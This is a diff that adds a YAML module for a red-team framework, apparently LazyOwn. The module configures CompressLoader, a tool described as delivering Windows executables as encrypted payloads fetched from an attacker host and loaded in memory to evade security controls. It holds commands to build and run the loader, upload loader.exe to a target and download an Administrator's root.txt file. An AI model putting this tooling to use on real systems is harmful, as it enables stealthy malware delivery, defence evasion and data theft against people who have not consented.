@@ -1,0 +1,24 @@
+name: CompressLoader
+description: 'CompressLoader is a specialized Windows PE payload delivery framework designed to bypass security controls by minimizing the on-disk footprint and obfuscating execution patterns. It transforms a standard Windows executable into a compressed, encrypted binary artifact that is retrieved over the network and reflectively loaded into memory without ever touching the targets physical disk
+
+  '
+author: LazyOwn RedTeam
+version: '1.0'
+enabled: true
+params:
+- name: lhost
+  type: string
+  required: true
+  description: lhost target.
+os: any
+trigger: []
+tool:
+  name: CompressLoader
+  repo_url: https://github.com/grisuno/CompressLoader.git
+  install_path: external/.exploit/CompressLoader
+  install_command: git restore . ; git pull ; chmod +x *.sh ; make all
+  execute_command: git restore . ; git pull ; chmod +x *.sh ; make run
+  download_file: C:\Users\Administrator\Desktop\root.txt
+  upload_file: windows ./external/.exploit/CompressLoader/loader.exe
+  lazycommand: aes_pe, encodewinbase64 .\loader {lhost} 80 cipher.bin key.bin
+category: 04. Post-Exploitation
